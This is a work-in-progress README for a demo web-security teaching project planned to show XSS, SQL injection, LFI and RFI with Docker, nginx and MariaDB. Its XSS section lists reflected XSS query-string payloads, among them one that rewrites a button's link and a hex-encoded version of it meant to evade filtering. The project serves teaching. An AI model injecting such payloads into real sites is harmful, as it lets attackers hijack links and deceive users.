# Demo Web Security

This project and this readme is WIP.

## Idea

 * Simple Webproject to show XSS, SQL Injection, LFI, RFI...
 * Database: Maria DB in Docker-Containter
 * Webserver: nginx in Docker-Conteiner
 * Docker-Compose for start all
 * Get client side package with yarn

## Keywords
 * Button on Webpage to create/reset the database
 * Bootstrap or Semantic UI
 * PHP or Python or JS as server language?
 * ...

## XSS

[Reference][1]

### Demo 1

```javascript
?name=guest<script>alert('XSS!')</script>
```

```javascript
?name=Fabian<script>window.onload = function() {var link=document.getElementsByClassName("btn");link[0].href="https://duckduckgo.com/";}</script>
```

Encode the string from ASCI to Hex (http://convertstring.com/de/EncodeDecode/HexEncode): 
```
?name=Fabian%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%43%6c%61%73%73%4e%61%6d%65%28%22%62%74%6e%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%64%75%63%6b%64%75%63%6b%67%6f%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e
```



[1]: http://www.thegeekstuff.com/2012/02/xss-attack-examples/
